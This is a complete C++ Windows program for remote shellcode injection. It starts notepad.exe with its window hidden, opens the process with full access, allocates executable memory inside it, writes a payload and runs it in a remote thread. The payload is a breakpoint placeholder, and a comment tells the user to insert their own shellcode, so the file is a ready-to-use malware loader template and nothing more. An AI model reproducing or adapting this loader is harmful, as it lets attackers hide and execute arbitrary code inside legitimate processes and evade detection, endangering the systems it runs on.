#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <vector>

using namespace std;

int main()
{
    // FIX 1: Use Wide-character versions of the structures to match CreateProcessW
    STARTUPINFOW start_info;
    PROCESS_INFORMATION process_info;

    HANDLE hProcess = NULL;

    ZeroMemory(&start_info, sizeof(start_info));
    start_info.cb = sizeof(start_info);
    ZeroMemory(&process_info, sizeof(process_info));

    start_info.dwFlags = STARTF_USESHOWWINDOW;
    start_info.wShowWindow = SW_HIDE; // Hides the target window

    wchar_t process_name[] = L"notepad.exe";

    // Create the target process in a suspended state or hidden (as per flags)
    BOOL iscreated = CreateProcessW(NULL, process_name, NULL, NULL, FALSE, 0, NULL, NULL, &start_info, &process_info);

    if(iscreated)
    {
        cout << "[+] Successfully Created New Process" << "\n";
    }
    else
    {
        cout << "[-] Failed to Create New Process. Error: " << GetLastError() << "\n";
        return EXIT_FAILURE;
    }

    // We already have the handle from PROCESS_INFORMATION, but demonstrating OpenProcess logic:
    // Ideally, use process_info.hProcess directly if permissions allow.
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_info.dwProcessId);

    if (hProcess != NULL)
    {
        cout << "[+] Got Notepad Process Handle: " << hProcess << "\n";
    }
    else
    {
        cout << "[-] Didn't Get Notepad Process Handle. Error: " << GetLastError() << "\n";
        return EXIT_FAILURE;
    }

    // SAFE PLACEHOLDER: 0xCC is the Opcode for INT 3 (Debug Breakpoint).
    // This is standard for testing injection without malicious actions.

unsigned char shellcode[] = "\xCC\xCC\xCC\xCC"; //write your shellcode here, for example: "\xCC\xCC\xCC\xCC"; // 4 INT 3 instructions for testing


    SIZE_T shellcodelen = sizeof(shellcode);

    // Allocate memory in the remote process
    LPVOID rBuffer = VirtualAllocEx(hProcess, NULL, shellcodelen, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    if (rBuffer != NULL)
    {
        cout << "[+] Successfully Allocated Memory Space RWX in remote process: " << rBuffer << "\n";
    }
    else
    {
        cout << "[-] Failed to Allocate Memory Space. Error: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Write the payload to the allocated memory
    SIZE_T bytesWritten;
    BOOL isWritten = WriteProcessMemory(hProcess, rBuffer, shellcode, shellcodelen, &bytesWritten);

    if (isWritten)
    {
        cout << "[+] Successfully Written Payload to process\n";
    }
    else
    {
        cout << "[-] Failed to write payload. Error: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Create a thread in the remote process to execute the payload
    DWORD TID = 0;
    HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

    if (hThread != NULL)
    {
        cout << "[+] Successfully Executed Remote Thread. TID: " << TID << "\n";
        WaitForSingleObject(hThread, 5000); // Wait briefly to see if it runs
        CloseHandle(hThread);
    }
    else
    {
        cout << "[-] Execution Failed. Error: " << GetLastError() << "\n";
    }

    // Cleanup
    if (hProcess) CloseHandle(hProcess);
    if (process_info.hProcess) CloseHandle(process_info.hProcess);
    if (process_info.hThread) CloseHandle(process_info.hThread);

    return EXIT_SUCCESS;
}
